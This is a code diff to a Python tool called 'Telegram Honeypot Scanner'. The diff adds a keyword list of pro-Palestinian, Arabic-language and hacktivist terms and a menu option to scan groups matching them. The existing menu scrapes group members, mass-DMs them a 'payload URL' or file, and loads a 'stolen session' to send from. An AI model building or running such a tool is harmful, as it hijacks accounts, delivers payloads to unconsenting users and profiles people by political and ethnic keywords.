@@ -52,6 +52,16 @@ ALL_TERMS = CORE_TERMS + [
     "EagleSpy", "NjRAT", "QuasarRAT", "XWorm", "Remcos", "AgentTesla",
 ]
 
+# Anti-Israel extremist keywords (for IL database honeypot)
+EXTREMIST_TERMS = [
+    "#OpIsrael", "#FreePalestine", "#AlAqsa", "#Resistance",
+    "Israel leak", "Israel database", "Israel hack", "IDF leak",
+    "Zionist", "مقاومة", "القسام", "حماس",
+    "#Anonymous", "#GhostSec", "#AnonGhost",
+    "Israeli data", "Israel doxx", "IDF data",
+    "#CyberIntifada", "#ElectronicIntifada",
+]
+
 # ── OUTPUT FILES ─────────────────────────────────────────────────────────────
 OUTPUT_JSON     = "osint_results.json"
 OUTPUT_CHANNELS = "osint_channels.txt"
@@ -402,16 +412,17 @@ async def main():
     print("=" * 60)
     print("  TELEGRAM HONEYPOT SCANNER")
     print("=" * 60)
-    print("  1. Full scan       — find threat actor groups")
-    print("  2. Quick scan      — 10 core tags")
-    print("  3. Group scrape    — dump members to JSON")
-    print("  4. Auto-distribute — DM honeypot to members")
-    print("  5. Load tdata      — use stolen session for sending")
+    print("  1. Full scan       — RAT/stealer groups (cybercriminals)")
+    print("  2. Quick scan      — 10 core tags only")
+    print("  3. Extremist scan  — anti-Israel/hacktivists")
+    print("  4. Group scrape    — dump members to JSON")
+    print("  5. Auto-distribute — DM honeypot to members")
+    print("  6. Load tdata      — use stolen session for sending")
     print("=" * 60)
 
-    choice = input("Select [1-5]: ").strip()
+    choice = input("Select [1-6]: ").strip()
 
-    if choice in ("1", "2", "3"):
+    if choice in ("1", "2", "3", "4"):
         # Use scanner account
         client = TelegramClient(
             SCANNER["session"],
@@ -433,9 +444,11 @@ async def main():
             elif choice == "2":
                 await run_scan(client, CORE_TERMS, max_pages=1)
             elif choice == "3":
+                await run_scan(client, EXTREMIST_TERMS, max_pages=10)
+            elif choice == "4":
                 await run_group_scrape(client)
 
-    elif choice == "4":
+    elif choice == "5":
         # Use sender account
         print("\n[*] Distribution mode:")
         print("  1. Link only      — send message with payload URL")
@@ -478,13 +491,13 @@ async def main():
                 else:
                     print(f"[!] File not found: {file_path}")
 
-    elif choice == "5":
+    elif choice == "6":
         client = await load_tdata_session()
         if client:
             async with client:
                 me = await client.get_me()
                 print(f"[+] Logged in as: {me.first_name} (@{me.username})")
-                print("[*] Session saved - use option 4 with this session")
+                print("[*] Session saved - use option 5 with this session")
 
 
 if __name__ == "__main__":
